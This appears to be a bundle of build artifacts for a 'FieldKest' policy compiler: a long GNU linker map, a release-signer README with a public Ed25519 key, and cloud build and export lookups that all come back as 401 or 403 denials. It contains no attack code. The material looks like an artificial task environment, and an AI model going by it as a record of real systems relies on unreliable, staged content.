+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(getdtsz.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(init-misc.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(readonly-area.o)
+ .bss           0x00000000005e1260        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-catch.o)
+ .bss           0x00000000005e1260        0x4 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-close.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-exception.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-execstack.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-lookup.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-open.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-reloc.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-scope.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-sort-maps.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-thread_gscope_wait.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-trampoline.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-version.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(tlsdesc.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-tlsdesc.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(rtld_static_init.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(__longjmp.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(funlockfile.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(grouping_iterator.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(isoc23_sscanf.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(printf_buffer_pad_1.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(printf_buffer_putc_1.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(printf_buffer_puts_1.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(printf_buffer_to_file.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(printf_buffer_write.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(printf_fp.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(printf_fphex.o)
+ .bss           0x00000000005e1264        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(printf_function_invoke.o)
+ *fill*         0x00000000005e1264        0x4
+ .bss           0x00000000005e1268       0x10 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(reg-modifier.o)
+                0x00000000005e1268                __printf_modifier_table
+ .bss           0x00000000005e1278       0x14 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(reg-printf.o)
+                0x00000000005e1278                __printf_function_table
+                0x00000000005e1280                __printf_arginfo_table
+                0x00000000005e1280                __libc_reg_printf_freemem_ptr
+ *fill*         0x00000000005e128c        0x4
+ .bss           0x00000000005e1290        0xc /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(reg-type.o)
+                0x00000000005e1290                __libc_reg_type_freemem_ptr
+                0x00000000005e1290                __printf_va_arg_table
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(translated_number_width.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(vfscanf-internal.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wprintf_buffer_putc_1.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wprintf_buffer_to_file.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(fseek.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(iofread_u.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dladdr.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dladdr1.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dlclose.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dlerror.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dlinfo.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dlmopen.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dlopen.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dlsym.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dlvsym.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(libc_dlerror_result.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(alloca_cutoff.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(nptl-stack.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(alloc_buffer_alloc_array.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(alloc_buffer_create_failure.o)
+ .bss           0x00000000005e129c        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(cacheinfo.o)
+ *fill*         0x00000000005e129c        0x4
+ .bss           0x00000000005e12a0        0x8 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(mbrlen.o)
+ .bss           0x00000000005e12a8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcpcpy-avx2.o)
+ .bss           0x00000000005e12a8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wcpcpy-evex.o)
+ .bss           0x00000000005e12a8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(offtime.o)
+ *fill*         0x00000000005e12a8       0x18
+ .bss           0x00000000005e12c0       0x38 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(localtime.o)
+                0x00000000005e12c0                _tmbuf
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(get_child_max.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wctrans.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(towctrans.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-call-libc-early-init.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-call_fini.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-deps.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-init.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-lookup-direct.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-runtime.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-addr.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-sym.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strtod.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strtof.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strtold.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(divrem.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dbl2mpn.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(ldbl2mpn.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(float1282mpn.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strtof128.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strtof128_l.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(strtof128_nan.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(mpn2float128.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(asprintf.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(printf_buffer_as_file.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(printf_buffer_flush.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wprintf_buffer_done.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(wprintf_buffer_flush.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/libgcc.a(addtf3.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/libgcc.a(multf3.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/libgcc.a(unordtf2.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/libgcc.a(letf2.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/libgcc.a(sfp-exceptions.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/libgcc_eh.a(unwind-c.o)
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/crtend.o
+ .bss           0x00000000005e12f8        0x0 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crtn.o
+ *(COMMON)
+                0x00000000005e12f8                . = ALIGN ((. != 0x0)?0x8:0x1)
+
+.lbss
+ *(.dynlbss)
+ *(.lbss .lbss.* .gnu.linkonce.lb.*)
+ *(LARGE_COMMON)
+                0x00000000005e12f8                . = ALIGN (0x8)
+                0x00000000005e12f8                . = SEGMENT_START ("ldata-segment", .)
+
+.lrodata
+ *(.lrodata .lrodata.* .gnu.linkonce.lr.*)
+
+.ldata          0x00000000005e32f8        0x0
+ *(.ldata .ldata.* .gnu.linkonce.l.*)
+                0x00000000005e32f8                . = ALIGN ((. != 0x0)?0x8:0x1)
+                0x00000000005e32f8                . = ALIGN (0x8)
+                0x00000000005e12f8                _end = .
+                [!provide]                        PROVIDE (end = .)
+                0x00000000005e32f8                . = DATA_SEGMENT_END (.)
+
+.stab
+ *(.stab)
+
+.stabstr
+ *(.stabstr)
+
+.stab.excl
+ *(.stab.excl)
+
+.stab.exclstr
+ *(.stab.exclstr)
+
+.stab.index
+ *(.stab.index)
+
+.stab.indexstr
+ *(.stab.indexstr)
+
+.comment        0x0000000000000000       0x2d
+ *(.comment)
+ .comment       0x0000000000000000       0x2d /usr/lib/gcc/x86_64-linux-gnu/13/crtbeginT.o
+                                         0x2e (size before relaxing)
+ .comment       0x000000000000002d       0x2e fieldkest-policyc.o
+ .comment       0x000000000000002d       0x2e /usr/lib/gcc/x86_64-linux-gnu/13/crtend.o
+
+.note.stapsdt   0x0000000000000000     0x1688
+ .note.stapsdt  0x0000000000000000       0x50 /usr/lib/gcc/x86_64-linux-gnu/13/libstdc++.a(eh_catch.o)
+ .note.stapsdt  0x0000000000000050       0x98 /usr/lib/gcc/x86_64-linux-gnu/13/libstdc++.a(eh_throw.o)
+ .note.stapsdt  0x00000000000000e8       0x98 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(lowlevellock.o)
+ .note.stapsdt  0x0000000000000180       0xd4 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(pthread_mutex_lock.o)
+ .note.stapsdt  0x0000000000000254      0x120 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(pthread_mutex_unlock.o)
+ .note.stapsdt  0x0000000000000374       0x94 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(pthread_rwlock_rdlock.o)
+ .note.stapsdt  0x0000000000000408       0x48 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(pthread_rwlock_unlock.o)
+ .note.stapsdt  0x0000000000000450       0x98 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(pthread_rwlock_wrlock.o)
+ .note.stapsdt  0x00000000000004e8      0xeac /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(malloc.o)
+ .note.stapsdt  0x0000000000001394       0x50 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-load.o)
+ .note.stapsdt  0x00000000000013e4       0x50 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(setjmp.o)
+ .note.stapsdt  0x0000000000001434       0x9c /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-close.o)
+ .note.stapsdt  0x00000000000014d0      0x110 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(dl-open.o)
+ .note.stapsdt  0x00000000000015e0       0xa8 /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/libc.a(__longjmp.o)
+
+.gnu.build.attributes
+ *(.gnu.build.attributes .gnu.build.attributes.*)
+
+.debug
+ *(.debug)
+
+.line
+ *(.line)
+
+.debug_srcinfo
+ *(.debug_srcinfo)
+
+.debug_sfnames
+ *(.debug_sfnames)
+
+.debug_aranges
+ *(.debug_aranges)
+
+.debug_pubnames
+ *(.debug_pubnames)
+
+.debug_info
+ *(.debug_info .gnu.linkonce.wi.*)
+
+.debug_abbrev
+ *(.debug_abbrev)
+
+.debug_line
+ *(.debug_line .debug_line.* .debug_line_end)
+
+.debug_frame
+ *(.debug_frame)
+
+.debug_str
+ *(.debug_str)
+
+.debug_loc
+ *(.debug_loc)
+
+.debug_macinfo
+ *(.debug_macinfo)
+
+.debug_weaknames
+ *(.debug_weaknames)
+
+.debug_funcnames
+ *(.debug_funcnames)
+
+.debug_typenames
+ *(.debug_typenames)
+
+.debug_varnames
+ *(.debug_varnames)
+
+.debug_pubtypes
+ *(.debug_pubtypes)
+
+.debug_ranges
+ *(.debug_ranges)
+
+.debug_addr
+ *(.debug_addr)
+
+.debug_line_str
+ *(.debug_line_str)
+
+.debug_loclists
+ *(.debug_loclists)
+
+.debug_macro
+ *(.debug_macro)
+
+.debug_names
+ *(.debug_names)
+
+.debug_rnglists
+ *(.debug_rnglists)
+
+.debug_str_offsets
+ *(.debug_str_offsets)
+
+.debug_sup
+ *(.debug_sup)
+
+.gnu.attributes
+ *(.gnu.attributes)
+
+/DISCARD/
+ *(.note.GNU-stack)
+ *(.gnu_debuglink)
+ *(.gnu.lto_*)
+OUTPUT(fieldkest-policyc elf64-x86-64)
+
+===== RELEASE SIGNER FILES =====
+##### release-signer-history/release-signer-history/README.md
+# FieldKest release signer history
+
+This repository records the accepted release lineage, public verification key, and rollover history. Encrypted retired signer material was removed from the current tree.
+
+##### release-signer-history/release-signer-history/release-public-key.json
+{"algorithm":"Ed25519","key_id":"fk-release-2026-old","lineage":"fieldkest-release-2026","public_key_base64":"fVb1PGuoR/d/np/rH3oJG9CgVCWD+nQkoEA/zK016dg=","schema":"fieldkest.release-key/v1"}
+
+===== CLOUD BUILD RECORD BLD-REL-742 =====
+--- BLD-REL-742
+{"error":"authentication_required"}
+ [401]
+--- BLD-1842
+{"error":"k3s_rbac_denied"}
+ [403]
+--- BLD-REL-741
+{"error":"k3s_rbac_denied"}
+ [403]
+--- BLD-REL-698
+{"error":"k3s_rbac_denied"}
+ [403]
+===== CLOUD EXPORTS =====
+--- EXP-2841
+{"error":"k3s_rbac_denied"}
+ [403]
+--- EXP-2841/definition
+{"error":"k3s_rbac_denied"}
+ [403]
+--- EXP-2841/revisions
+{"error":"k3s_rbac_denied"}
+ [403]
+--- EXP-2841/handover
+{"error":"k3s_rbac_denied"}
+ [403]
